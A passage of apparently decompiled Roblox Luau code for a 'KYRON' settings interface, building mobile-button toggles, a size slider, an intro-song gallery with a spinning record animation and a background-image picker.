          for k, v93 in pairs(tbl45) do
            local flag30 = k == "All" and flag29 or KYRONHiddenMobileButtons[k] == true
            v93.mark.Text = flag30 and "✓" or ""
            v93.mark.TextTransparency = flag30 and 0 or 1
            v93.mark.TextColor3 = _G._KYRONInvertUI and Color3.fromRGB(240, 255, 255) or Color3.fromRGB(0, 0, 0)
            v93.box.BackgroundColor3 = _G._KYRONInvertUI and (flag30 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(220, 220, 225)) or flag30 and (_G._KYRONAccent or Color3.fromRGB(255, 255, 255)) or tbl37.key
            v93.box.BackgroundTransparency = flag30 and 0.4 or 0.35
          end
        end

        _G._KYRONRefreshSpecificButtonHideUI = KYRONRefreshSpecificButtonHideUI

        local function fn68(text, layoutOrder)
          local textButton2 = Instance.new("TextButton")
          textButton2.Name = "HideButton_" .. text:gsub("%s+", "")
          textButton2.LayoutOrder = layoutOrder
          textButton2.BackgroundColor3 = tbl37.row
          textButton2.BackgroundTransparency = 0.28
          textButton2.BorderSizePixel = 0
          textButton2.Size = UDim2.new(1, 0, 0, 24)
          textButton2.Text = ""
          textButton2.AutoButtonColor = false
          textButton2.ZIndex = 5
          textButton2.Parent = frame4
          fn56(textButton2, 7)
          local frame5 = Instance.new("Frame")
          frame5.Name = "Checkbox"
          frame5.Size = UDim2.new(0, 15, 0, 15)
          frame5.Position = UDim2.new(0, 7, 0.5, -7.5)
          frame5.BackgroundColor3 = tbl37.key
          frame5.BackgroundTransparency = 0.35
          frame5.BorderSizePixel = 0
          frame5.ZIndex = 6
          frame5.Parent = textButton2
          fn56(frame5, 4)
          local textLabel = Instance.new("TextLabel")
          textLabel.Name = "Check"
          textLabel.BackgroundTransparency = 1
          textLabel.Size = UDim2.new(1, 0, 1, 0)
          textLabel.Text = ""
          textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
          textLabel.TextSize = 13
          textLabel.Font = Enum.Font.GothamBlack
          textLabel.ZIndex = 7
          textLabel.Parent = frame5
          local textLabel2 = Instance.new("TextLabel")
          textLabel2.BackgroundTransparency = 1
          textLabel2.Position = UDim2.new(0, 2, 0, 0)
          textLabel2.Size = UDim2.new(1, -36, 1, 0)
          textLabel2.Text = text
          textLabel2.TextColor3 = tbl37.text
          textLabel2.TextSize = 10
          textLabel2.Font = Enum.Font.GothamMedium
          textLabel2.TextXAlignment = Enum.TextXAlignment.Left
          textLabel2.ZIndex = 6
          textLabel2.Parent = textButton2
          tbl45[text] = { box = frame5, mark = textLabel }

          textButton2.Activated:Connect(function()
            local KYRONHiddenMobileButtons = _G._KYRONHiddenMobileButtons or {}
            _G._KYRONHiddenMobileButtons = KYRONHiddenMobileButtons

            if text == "All" then
              local flag29 = true

              for _, v93 in ipairs(tbl44) do
                if KYRONHiddenMobileButtons[v93] ~= true then
                  flag29 = false
                  break
                end
              end

              for _, v93 in ipairs(tbl44) do
                KYRONHiddenMobileButtons[v93] = not flag29
              end
            else
              KYRONHiddenMobileButtons[text] = KYRONHiddenMobileButtons[text] ~= true
            end

            if _G._KYRONApplySpecificMobileButtonHiding then
              pcall(_G._KYRONApplySpecificMobileButtonHiding)
            end

            KYRONRefreshSpecificButtonHideUI()

            if autoSaveSettings.auto then
              pcall(saveKYRONSettings, true)
            end
          end)
        end

        fn68("All", 1)

        for i, v93 in ipairs(tbl44) do
          fn68(v93, i + 1)
        end

        KYRONRefreshSpecificButtonHideUI()
        local arrowButton = hideMobButtons:FindFirstChild("ArrowButton")

        if arrowButton then
          local flag29 = false
          local n34 = #tbl44 * 27 + 28

          arrowButton.Activated:Connect(function()
            flag29 = not flag29
            frame4.Visible = true
            tbl38.expanded(arrowButton, flag29)
            TweenService:Create(frame4, TweenInfo.new(0.14), { Size = UDim2.new(1, -4, 0, flag29 and n34 or 0) }):Play()

            if not flag29 then
              task.delay(0.15, function()
                if not flag29 then
                  frame4.Visible = false
                end
              end)
            end
          end)
        end

        local clamp = math.clamp
        local floor2 = math.floor
        local KYRONMobileBtnScale = _G._KYRONMobileBtnScale or 1
        local v93 = 35
        local v94, v95

        v94, v95, v92 = fn64(Settings, "Button Size %", clamp(floor2(KYRONMobileBtnScale * 100 + 0.5), 40, 250), v93, 250, 5, function(arg)
          _G._KYRONMobileBtnScale = arg / 100

          if _G._KYRONMobileBtnApplyScale then
            pcall(_G._KYRONMobileBtnApplyScale)
          end

          if autoSaveSettings.auto then
            task.spawn(function()
              pcall(saveKYRONSettings)
            end)
          end
        end)

        moveButtons = fn63(Settings, "Move Buttons", { button = true })
        resetButtons = fn63(Settings, "Reset Buttons", { button = true })

        if not flag28 then
          local sectionMobileButtons = Settings:FindFirstChild("Section_Mobile Buttons")

          if sectionMobileButtons then
            sectionMobileButtons.Visible = false
          end

          for _, v96 in ipairs({
            Settings:FindFirstChild("Circle Buttons"),
            hideMobButtons,
            frame4,
            v94,
            moveButtons,
            resetButtons,
          }) do
            if v96 then
              v96.Visible = false
            end
          end
        end
      end

      createTextLabel(Settings, "Interface")
      local open

      do
        local introSong = fn63(Settings, "Intro Song")
        local frame4 = Instance.new("Frame")
        frame4.Name = "IntroSongPill"
        frame4.Size = UDim2.new(0, 126, 0, 26)
        frame4.Position = UDim2.new(1, -132, 0.5, -8)
        frame4.ZIndex = 25
        frame4.Parent = introSong
        createUIStroke(frame4)
        local v93 = createTextButton(introSong, "<", 28)
        v93.Name = "IntroSongPrevious"
        v93.Font = Enum.Font.GothamBlack
        v93.Parent = frame4
        fn62(v93, UDim2.new(0, 28, 1, 0), UDim2.new(0, 2, 0, 0))
        open = createTextButton(introSong, "OPEN", 58)
        open.Name = "IntroSongButton"
        open.TextSize = 10
        open.Parent = frame4
        local udim22 = UDim2.new
        fn62(open, UDim2.new(0, 62, 1, 0), udim22(0, 31, 0, 0))
        local v94 = createTextButton(introSong, ">", 28)
        v94.Name = "IntroSongNext"
        v94.Font = Enum.Font.GothamBlack
        v94.Parent = frame4
        local udim23 = UDim2.new
        fn62(v94, UDim2.new(0, 28, 1, 0), udim23(1, -30, 0, 0))
        v93.Visible = false
        v94.Visible = false

        local function fn68()
          local v95 = ipairs
          local SoundService = game:GetService("SoundService")

          for _, child in v95(SoundService:GetChildren()) do
            if child:IsA("Sound") and child.Name == "KYRONIntroMusic" then
              child:Destroy()
            end
          end

          playIntroMusic()
        end

        local function fn69(arg)
          _G._KYRONIntroSongIndex = (_G._KYRONIntroSongIndex - 1 + arg) % #introSongs + 1
          _G._KYRONIntroSongLocked = true
          open.Text = "OPEN"

          if _G._KYRONRefreshSongGallery then
            _G._KYRONRefreshSongGallery()
          end

          task.spawn(function()
            pcall(saveKYRONSettings)
          end)

          fn68()
        end

        v93.Activated:Connect(function()
          fn69(-1)
        end)

        v94.Activated:Connect(function()
          fn69(1)
        end)

        local function fn70()
          local flag29 = KYRONSafeModeEnabled == true
          local KYRONSongGallery = screenGui:FindFirstChild("KYRONSongGallery")

          if KYRONSongGallery then
            KYRONSongGallery:Destroy()
          end

          local canvasGroup = Instance.new("CanvasGroup")
          canvasGroup.Name = "KYRONSongGallery"
          canvasGroup.AnchorPoint = Vector2.new(0.5, 0.5)
          canvasGroup.Position = UDim2.fromScale(0.5, 0.5)
          canvasGroup.Size = flag29 and UDim2.new(0, 280, 0, 300) or UDim2.new(0, 360, 0, 350)
          canvasGroup.BackgroundColor3 = tbl37.panel
          canvasGroup.BorderSizePixel = 0
          canvasGroup.Visible = false
          canvasGroup.ZIndex = 120
          canvasGroup.Parent = screenGui
          fn56(canvasGroup, 14)
          local instance6 = Instance.new("UIGradient")
          instance6.Color = ColorSequence.new(tbl37.panel, tbl37.row)
          instance6.Rotation = 35
          instance6.Parent = canvasGroup
          local frame5 = Instance.new("Frame")
          frame5.BackgroundTransparency = 1
          frame5.Size = UDim2.new(1, -28, 0, 34)
          frame5.Position = UDim2.new(0, 20, 0, 7)
          frame5.Active = true
          frame5.ZIndex = 131
          frame5.Parent = canvasGroup
          local v95 = fn58
          local n34 = flag29 and 15 or 17
          local gothamBlack = Enum.Font.GothamBlack
          local text = tbl37.text
          local KYRONMusic = v95(frame5, "KYRON MUSIC", n34, UDim2.new(0, 0, 0, 3), gothamBlack, text)
          KYRONMusic.ZIndex = 132
          local v96 = tbl38.gallery(canvasGroup, frame5, KYRONMusic)
          local v97 = createTextButton(frame5, "×", 25)
          v97.Name = "CloseSongGallery"
          v97.TextSize = 20
          v97.Position = UDim2.new(1, -32, 0, 4)
          v97.BackgroundTransparency = 1
          v97.ZIndex = 133
          local uiStroke = v97:FindFirstChildOfClass("UIStroke")

          if uiStroke then
            uiStroke:Destroy()
          end

          local flag30 = false
          local v98 = nil
          local v99 = nil
          local v100 = nil

          frame5.InputBegan:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
              return
            end
            local position2 = input.Position
            local position3 = canvasGroup.Position
            flag30 = true
            v98 = position2
            v99 = position3
            v100 = input

            input.Changed:Connect(function()
              if input.UserInputState == Enum.UserInputState.End then
                flag30 = false
              end
            end)
          end)

          frame5.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
              v100 = input
            end
          end)

          UserInputService.InputChanged:Connect(function(input)
            if flag30 and input == v100 then
              local n35 = input.Position - v98
              canvasGroup.Position = UDim2.new(v99.X.Scale, v99.X.Offset + n35.X, v99.Y.Scale, v99.Y.Offset + n35.Y)
            end
          end)

          local n35 = flag29 and 150 or 184
          local frame6 = Instance.new("Frame")
          frame6.Name = "AlbumDisplay"
          frame6.BackgroundTransparency = 1
          frame6.Position = UDim2.new(0, 20, 0, 43)
          frame6.Size = UDim2.new(1, -28, 0, n35)
          frame6.ZIndex = 131
          frame6.Parent = canvasGroup
          local n36 = flag29 and 100 or 128
          local frame7 = Instance.new("Frame")
          frame7.Name = "SpinningRecord"
          frame7.AnchorPoint = Vector2.new(0.5, 0.5)
          frame7.Position = UDim2.new(0.5, flag29 and 21 or 27, 0.5, -7)
          frame7.Size = UDim2.fromOffset(n36, n36)
          frame7.BackgroundColor3 = Color3.fromRGB(10, 5, 7)
          frame7.BorderSizePixel = 0
          frame7.ClipsDescendants = true
          frame7.ZIndex = 132
          frame7.Parent = frame6
          fn56(frame7, 999)
          local uiGradient = Instance.new("UIGradient")
          local colorSequence = ColorSequence.new
          local tbl44 = {}
          local v101 = ColorSequenceKeypoint.new(0, Color3.fromRGB(8, 8, 10))
          local v102 = ColorSequenceKeypoint.new(0.35, Color3.fromRGB(44, 45, 48))
          local v103 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(12, 12, 15))
          local v104 = ColorSequenceKeypoint.new(0.82, Color3.fromRGB(40, 32, 36))
          local new = ColorSequenceKeypoint.new
          local color2 = Color3.fromRGB
          local v105 = 12
          tbl44[1] = v101
          tbl44[2] = v102
          tbl44[3] = v103
          tbl44[4] = v104

          do
            local values = table.pack(new(1, color2(8, 8, v105)))
            table.move(values, 1, values.n, 5, tbl44)
          end

          uiGradient.Color = colorSequence(tbl44)
          uiGradient.Rotation = 18
          uiGradient.Parent = frame7
          local uiStroke2 = Instance.new("UIStroke")
          uiStroke2.Color = Color3.fromRGB(66, 66, 72)
          uiStroke2.Thickness = flag29 and 1 or 2
          uiStroke2.Transparency = 0.2
          uiStroke2.Parent = frame7

          for i, v106 in ipairs({ 0.72, 0.48 }) do
            local frame8 = Instance.new("Frame")
            frame8.Name = "Groove" .. i
            frame8.AnchorPoint = Vector2.new(0.5, 0.5)
            frame8.Position = UDim2.fromScale(0.5, 0.5)
            frame8.Size = UDim2.fromScale(v106, v106)
            frame8.BackgroundTransparency = 1
            frame8.BorderSizePixel = 0
            frame8.ZIndex = 133
            frame8.Parent = frame7
            fn56(frame8, 999)
            local uiStroke3 = Instance.new("UIStroke")
            uiStroke3.Color = Color3.fromRGB(90, 90, 96)
            uiStroke3.Thickness = 1
            uiStroke3.Transparency = 0.58
            uiStroke3.Parent = frame8
          end

          local instance7 = Instance.new("Frame")
          instance7.AnchorPoint = Vector2.new(0.5, 0.5)
          instance7.Position = UDim2.fromScale(0.5, 0.5)
          instance7.Size = UDim2.fromScale(0.25, 0.25)
          instance7.BackgroundColor3 = Color3.fromRGB(240, 255, 255)
          instance7.BackgroundTransparency = 0
          instance7.BorderSizePixel = 0
          instance7.ZIndex = 134
          instance7.Parent = frame7
          fn56(instance7, 999)
          local frame8 = Instance.new("Frame")
          frame8.AnchorPoint = Vector2.new(0.5, 0.5)
          frame8.Position = UDim2.fromScale(0.5, 0.5)
          frame8.Size = UDim2.fromOffset(flag29 and 5 or 7, flag29 and 5 or 7)
          frame8.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
          frame8.BorderSizePixel = 0
          frame8.ZIndex = 135
          frame8.Parent = frame7
          fn56(frame8, 999)
          local n37 = flag29 and 112 or 142
          local frame9 = Instance.new("Frame")
          frame9.AnchorPoint = Vector2.new(0.5, 0.5)
          frame9.Position = UDim2.new(0.5, flag29 and -31 or -35, 0.5, -3)
          frame9.Size = UDim2.fromOffset(n37 + 10, n37 + 5)
          frame9.Rotation = -5
          frame9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
          frame9.BackgroundTransparency = 0.48
          frame9.BorderSizePixel = 0
          frame9.ZIndex = 133
          frame9.Parent = frame6
          fn56(frame9, 7)
          local frame10 = Instance.new("Frame")
          frame10.Name = "RecordSleeve"
          frame10.AnchorPoint = Vector2.new(0.5, 0.5)
          frame10.Position = UDim2.new(0.5, flag29 and -25 or -44, 0.5, -7)
          frame10.Size = UDim2.fromOffset(n37, n37)
          frame10.Rotation = -5
          frame10.BackgroundColor3 = tbl37.row
          frame10.BorderSizePixel = 0
          frame10.ZIndex = 134
          frame10.Parent = frame6
          fn56(frame10, 7)
          local imageLabel = Instance.new("ImageLabel")
          imageLabel.Name = "SelectedSongCover"
          imageLabel.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
          imageLabel.BackgroundTransparency = 0
          imageLabel.BorderSizePixel = 0
          imageLabel.Position = UDim2.new(0, 0, 0, 0)
          imageLabel.Size = UDim2.new(1, 0, 1, 0)
          imageLabel.ScaleType = Enum.ScaleType.Crop
          imageLabel.ZIndex = 135
          imageLabel.Parent = frame10
          fn56(imageLabel, 7)
          local v106 = fn58
          local n38 = flag29 and 10 or 12
          local gothamBold = Enum.Font.GothamBold
          local text2 = tbl37.text
          local center = Enum.TextXAlignment.Center
          local v107 = v106(frame6, "", n38, UDim2.new(0, 0, 1, -18), gothamBold, text2, center)
          v107.Size = UDim2.new(1, 0, 0, 16)
          v107.ZIndex = 136
          v107.TextColor3 = Color3.fromRGB(240, 240, 240)

          for _, descendant in ipairs(frame6:GetDescendants()) do
            descendant:SetAttribute("_KYRONNoInvert", true)
          end

          local n39 = 47 + n35
          local scrollingFrame = Instance.new("ScrollingFrame")
          scrollingFrame.Name = "SongList"
          scrollingFrame.BackgroundTransparency = 1
          scrollingFrame.BorderSizePixel = 0
          scrollingFrame.Position = UDim2.new(0, 14, 0, n39)
          scrollingFrame.Size = UDim2.new(1, -28, 1, -(n39 + 12))
          scrollingFrame.CanvasSize = UDim2.new()
          scrollingFrame.ScrollBarThickness = 2
          scrollingFrame.ScrollBarImageTransparency = 0.22
          scrollingFrame.ScrollBarImageColor3 = tbl37.accent
          scrollingFrame.ZIndex = 131
          scrollingFrame.Parent = canvasGroup
          local uiListLayout = Instance.new("UIListLayout")
          uiListLayout.Padding = UDim.new(0, 4)
          uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
          uiListLayout.Parent = scrollingFrame

          uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, uiListLayout.AbsoluteContentSize.Y + 2)
          end)

          local tbl45 = {}

          local function KYRONRefreshSongGallery()
            local clamp = math.clamp
            local floor2 = math.floor
            local num = tonumber(_G._KYRONIntroSongIndex) or KYRONIntroSongIndex
            local n40 = #introSongs
            local v108 = clamp(floor2(num), 1, n40)
            local v109 = introSongs[v108]

            if imageLabel.Image ~= (v109.cover or "") then
              imageLabel.Image = v109.cover or ""
              imageLabel.ImageTransparency = 0.5
              tbl38.tween(imageLabel, "cover", 0.25, { ImageTransparency = 0 })
            end

            v107.Text = v109.name
            open.Text = "OPEN"

            for i, v110 in ipairs(tbl45) do
              local visible = i == v108
              v110.button:SetAttribute("Selected", visible)

              tbl38.tween(v110.button, "surface", 0.18, {
                BackgroundColor3 = visible and Color3.fromRGB(28, 28, 28) or Color3.fromRGB(15, 15, 15),
                BackgroundTransparency = 0,
              })

              v110.stroke.Color = Color3.fromRGB(255, 240, 255)
              v110.stroke.Thickness = 1
              tbl38.tween(v110.stroke, "selection", 0.18, { Transparency = visible and 0.78 or 1 })
              v110.name.TextColor3 = visible and Color3.fromRGB(255, 240, 255) or Color3.fromRGB(190, 190, 190)
              v110.status.Visible = visible
              v110.mark.Visible = visible
            end
          end

          _G._KYRONRefreshSongGallery = KYRONRefreshSongGallery

          for i, v108 in ipairs(introSongs) do
            local textButton2 = Instance.new("TextButton")
            textButton2.Name = "SongChoice" .. i
            textButton2.LayoutOrder = i
            textButton2.Size = UDim2.new(1, -4, 0, flag29 and 25 or 28)
            textButton2.BackgroundColor3 = tbl37.row
            textButton2.BackgroundTransparency = 0.3
            textButton2.BorderSizePixel = 0
            textButton2.Text = ""
            textButton2.AutoButtonColor = false
            textButton2.ZIndex = 132
            textButton2.Parent = scrollingFrame
            fn56(textButton2, 7)
            local uiStroke3 = Instance.new("UIStroke")
            uiStroke3.Color = Color3.fromRGB(70, 70, 78)
            uiStroke3.Transparency = 0.2
            uiStroke3.Parent = textButton2
            local gothamBold2 = Enum.Font.GothamBold
            local muted = tbl37.muted
            local left = Enum.TextXAlignment.Left
            local v109 = fn58(textButton2, string.format("%02d", i), 9, UDim2.new(0, 6, 0, 0), gothamBold2, muted, left)
            v109.Size = UDim2.new(0, 28, 1, 0)
            v109.TextYAlignment = Enum.TextYAlignment.Center
            v109.ZIndex = 133
            local v110 = fn58
            local name = v108.name
            local n40 = flag29 and 9 or 10
            local gothamMedium = Enum.Font.GothamMedium
            local text3 = tbl37.text
            local left2 = Enum.TextXAlignment.Left
            local v111 = v110(textButton2, name, n40, UDim2.new(0, 39, 0, 0), gothamMedium, text3, left2)
            v111.Size = UDim2.new(1, -104, 1, 0)
            v111.TextYAlignment = Enum.TextYAlignment.Center
            v111.ZIndex = 133
            local gothamMedium2 = Enum.Font.GothamMedium
            local right = Enum.TextXAlignment.Right
            local selected = fn58(textButton2, "SELECTED", 8, UDim2.new(1, -62, 0, 0), gothamMedium2, Color3.fromRGB(170, 170, 170), right)
            selected.Size = UDim2.new(0, 52, 1, 0)
            selected.ZIndex = 133
            local instance8 = Instance.new("Frame", textButton2)
            instance8.Name = "SelectedMarker"
            instance8.Size = UDim2.new(0, 2, 0, 16)
            instance8.Position = UDim2.new(0, 0, 0.5, -6)
            instance8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            instance8.BorderSizePixel = 0
            instance8.ZIndex = 133
            fn56(instance8, 1)

            for _, v112 in ipairs({ textButton2, uiStroke3, v109, v111, selected, instance8 }) do
              v112:SetAttribute("_NoKYRONTheme", true)
            end

            textButton2.MouseEnter:Connect(function()
              tbl38.tween(textButton2, "surface", 0.14, { BackgroundColor3 = Color3.fromRGB(34, 34, 34) })
            end)

            textButton2.MouseLeave:Connect(function()
              tbl38.tween(textButton2, "surface", 0.14, {
                BackgroundColor3 = textButton2:GetAttribute("Selected") and Color3.fromRGB(28, 28, 28) or Color3.fromRGB(15, 26, 15),
              })
            end)

            tbl45[i] = {
              button = textButton2,
              stroke = uiStroke3,
              name = v111,
              status = selected,
              mark = instance8,
            }

            textButton2.Activated:Connect(function()
              _G._KYRONIntroSongIndex = i
              _G._KYRONIntroSongLocked = true
              frame10.Rotation = -7
              frame9.Rotation = -7
              KYRONRefreshSongGallery()
              tbl38.tween(frame10, "tilt", 0.28, { Rotation = -10 })
              tbl38.tween(frame9, "tilt", 0.28, { Rotation = -5 })

              task.spawn(function()
                pcall(saveKYRONSettings)
              end)

              fn68()
            end)
          end

          local rotation = 0
          local connection2 = nil

          connection2 = RunService.RenderStepped:Connect(function(deltaTime)
            if not canvasGroup.Parent then
              connection2:Disconnect()
              return
            end

            if not canvasGroup.Visible then
              return
            end
            rotation = (rotation + deltaTime * 72) % 360
            frame7.Rotation = rotation
          end)

          open.Activated:Connect(function()
            KYRONRefreshSongGallery()
            v96(true)

            task.defer(function()
              if not canvasGroup.Parent then
                return
              end
              local v108 = tbl45[_G._KYRONIntroSongIndex]

              if v108 then
                scrollingFrame.CanvasPosition = Vector2.new(
                  0,
                  math.clamp(v108.button.AbsolutePosition.Y - scrollingFrame.AbsolutePosition.Y + scrollingFrame.CanvasPosition.Y, 0, math.max(0, uiListLayout.AbsoluteContentSize.Y - scrollingFrame.AbsoluteSize.Y))
                )
              end
            end)
          end)

          v97.Activated:Connect(function()
            v96(false)
          end)

          KYRONRefreshSongGallery()
        end

        fn70()
      end

      fn63(Settings, "Intro", { toggle = true })
      local tbl44

      tbl44 = {
        "rbxassetid://90631990302263",
        "rbxassetid://109619268613730",
        "rbxassetid://90453834580322",
        "rbxassetid://82173577293417",
        "rbxassetid://88369503310562",
        "rbxassetid://80708025126373",
        "rbxassetid://111949903851987",
        "rbxassetid://135181794444219",
      }

      local KYRONBgIdx, fn68, fn69, n34, fn70

      do
        local tbl45 = { { value = 0, name = "NONE", asset = "" } }

        for i, v93 in ipairs(tbl44) do
          tbl45[#tbl45 + 1] = { value = i, name = tostring(i), asset = v93 }
        end

        KYRONBgIdx = tonumber(_G._KYRONBgIdx)

        if KYRONBgIdx == nil or KYRONBgIdx < 0 or KYRONBgIdx > #tbl44 then
          KYRONBgIdx = 0
        end

        _G._KYRONBgIdx = KYRONBgIdx

        local function fn71()
          createTextLabel(Settings, "Background").LayoutOrder = 9000
        end

        fn71()
        local frame4 = Instance.new("Frame")
        frame4.Name = "BackgroundPicker"
        frame4.BackgroundColor3 = tbl37.row
        frame4.BackgroundTransparency = 0.3
        frame4.BorderSizePixel = 0
        frame4.Size = UDim2.new(1, -4, 0, 52)
        frame4.LayoutOrder = 9001
        frame4.ZIndex = 3
        frame4.Parent = Settings
        fn56(frame4, 11)
        fn57(frame4, 1.25)

        task.delay(3, function()
          pcall(function()
            game:GetService("ContentProvider"):PreloadAsync(tbl44)
          end)
        end)

        local tbl46 = {}
        local n35 = 42
        local scrollingFrame = Instance.new("ScrollingFrame")
        scrollingFrame.Name = "BgScroll"
        scrollingFrame.BackgroundTransparency = 1
        scrollingFrame.BorderSizePixel = 0
        scrollingFrame.Size = UDim2.new(1, -56, 1, 0)
        scrollingFrame.Position = UDim2.new(0, 28, 0, 0)
        scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
        scrollingFrame.ScrollBarThickness = 0
        scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
        scrollingFrame.CanvasSize = UDim2.new()
        scrollingFrame.Active = true
        scrollingFrame.ScrollingEnabled = true
        scrollingFrame.ClipsDescendants = true
        scrollingFrame.ZIndex = 4
        scrollingFrame.Parent = frame4

        local function fn72(arg)
          arg.Active = true
          arg.ScrollingEnabled = true
          local flag29 = false
          local n36 = 0

          arg.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
              flag29 = true
              n36 = input.Position.X
            end
          end)

          arg.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseWheel then
              local n37 = math.max(0, arg.AbsoluteCanvasSize.X - arg.AbsoluteWindowSize.X)
              arg.CanvasPosition = Vector2.new(math.clamp(arg.CanvasPosition.X - input.Position.Z * 48, 0, n37), 0)
            elseif flag29 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
              local n37 = input.Position.X - n36
              n36 = input.Position.X
              local n38 = math.max(0, arg.AbsoluteCanvasSize.X - arg.AbsoluteWindowSize.X)
              arg.CanvasPosition = Vector2.new(math.clamp(arg.CanvasPosition.X - n37, 0, n38), 0)
            end
          end)

          arg.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
              flag29 = false
            end
          end)
        end

        fn72(scrollingFrame)
        local uiListLayout = Instance.new("UIListLayout")
        uiListLayout.FillDirection = Enum.FillDirection.Horizontal
        uiListLayout.Padding = UDim.new(0, 24)
        uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
        uiListLayout.Parent = scrollingFrame
        local uiPadding = Instance.new("UIPadding")
        uiPadding.PaddingLeft = UDim.new(0, 2)
        uiPadding.Parent = scrollingFrame

        for i, v93 in ipairs(tbl45) do
          local imageButton2 = Instance.new("ImageButton")
          imageButton2.Name = "BgThumb" .. i
          imageButton2.LayoutOrder = i
          imageButton2.BackgroundColor3 = v93.value == 0 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(14, 14, 18)
          imageButton2.BackgroundTransparency = v93.value == 0 and 0 or 0.25
          imageButton2.BorderSizePixel = 0
          imageButton2.Image = v93.asset
          imageButton2.ImageColor3 = Color3.fromRGB(255, 255, 255)
          imageButton2.ImageTransparency = 0.22
          imageButton2.ScaleType = Enum.ScaleType.Crop
          imageButton2.Size = UDim2.new(0, 42, 0, 34)
          imageButton2.AutoButtonColor = false
          imageButton2.ZIndex = 10
          imageButton2.Parent = scrollingFrame
          Instance.new("UICorner", imageButton2).CornerRadius = UDim.new(0, 6)
          local uiStroke = Instance.new("UIStroke", imageButton2)
          uiStroke.Color = Color3.fromRGB(100, 80, 90)
          uiStroke.Thickness = 1
          uiStroke.Transparency = 0.4

          if v93.value == 0 then
            local textLabel = Instance.new("TextLabel", imageButton2)
            textLabel.Name = "NoneLabel"
            textLabel.BackgroundTransparency = 1
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.Text = "NONE"
            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            textLabel.TextSize = 9
            textLabel.Font = Enum.Font.GothamMedium
            textLabel.ZIndex = 6
          end

          tbl46[i] = { btn = imageButton2, stroke = uiStroke, value = v93.value }
        end

        fn68 = function()
          tbl38.backgroundRevision = (tbl38.backgroundRevision or 0) + 1
          local backgroundRevision = tbl38.backgroundRevision
          local v93 = KYRONBgIdx
          local image = v93 == 0 and "" or tbl44[v93]
          _G._KYRONInvertUI = false
          local flag29 = false

          local function fn73()
            if flag29 or tbl38.backgroundRevision ~= backgroundRevision or not instance3.Parent then
              return
            end
            flag29 = true

            if tbl38.backgroundOverlay then
              tbl38.backgroundOverlay:Destroy()
              tbl38.backgroundOverlay = nil
            end

            local clone = nil

            if tbl38.backgroundReady and frame2.Visible and instance3.Image ~= image then
              clone = instance3:Clone()
              clone.Name = "BackgroundTransition"
              clone:SetAttribute("_NoKYRONTheme", true)
              clone.Parent = frame2
              tbl38.backgroundOverlay = clone
            end

            instance3.Image = image or ""
            instance3.ImageTransparency = 0
            instance3.ImageColor3 = _G._KYRONBackgroundColorMatch == true and (_G._KYRONAccent or tbl37.accent) or Color3.fromRGB(240, 255, 255)
            instance3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            instance3.BackgroundTransparency = v93 == 0 and 0 or 1
            tbl38.backgroundReady = true

            if clone then
              tbl38.tween(clone, "crossfade", 0.38, { ImageTransparency = 1, BackgroundTransparency = 1 }).Completed:Once(function()
                if tbl38.backgroundOverlay == clone then
                  tbl38.backgroundOverlay = nil
                end

                clone:Destroy()
              end)
            end
          end

          if not tbl38.backgroundReady or image == "" then
            fn73()
          else
            task.spawn(function()
              pcall(function()
                game:GetService("ContentProvider"):PreloadAsync({ image })
              end)

              fn73()
            end)

            task.delay(1.2, fn73)
          end
        end

        fn69 = function()
          for _, v93 in ipairs(tbl46) do
            local flag29 = v93.value == KYRONBgIdx

            TweenService:Create(v93.stroke, TweenInfo.new(0.15), {
              Color = flag29 and Color3.fromRGB(240, 240, 255) or Color3.fromRGB(80, 80, 90),
              Transparency = flag29 and 0.05 or 0.48,
              Thickness = flag29 and 2 or 1,
            }):Play()

            TweenService:Create(v93.btn, TweenInfo.new(0.15), {
              BackgroundTransparency = v93.value == 0 and 0 or flag29 and 0.05 or 0.25,
              ImageTransparency = v93.value == 0 and 1 or flag29 and 0 or 0.22,
            }):Play()

            if v93.value == 0 then
              v93.btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
              local noneLabel = v93.btn:FindFirstChild("NoneLabel")

              if noneLabel then
                noneLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
              end
            end
          end
        end

        for _, v93 in ipairs(tbl46) do
          v93.btn.Activated:Connect(function()
            KYRONBgIdx = v93.value
            _G._KYRONBgIdx = v93.value
            fn68()

            if _G._KYRONStealBarMatch and _G._KYRONApplyStealBarBackground then
              pcall(_G._KYRONApplyStealBarBackground)
            end

            fn69()

            if autoSaveSettings.auto then
              task.spawn(function()
                pcall(saveKYRONSettings)
              end)
            end
          end)
        end

        fn68()
        fn69()

        local function createTextButton3(text, arg)
          local textButton2 = Instance.new("TextButton", frame4)
          textButton2.Name = arg and "BgArrowLeft" or "BgArrowRight"
          textButton2.Text = text
          textButton2.Font = Enum.Font.GothamMedium
          textButton2.TextSize = 14
          textButton2.TextColor3 = Color3.fromRGB(240, 255, 255)
          textButton2.BackgroundColor3 = Color3.fromRGB(14, 18, 23)
          textButton2.BackgroundTransparency = 0.05
          textButton2.BorderSizePixel = 0
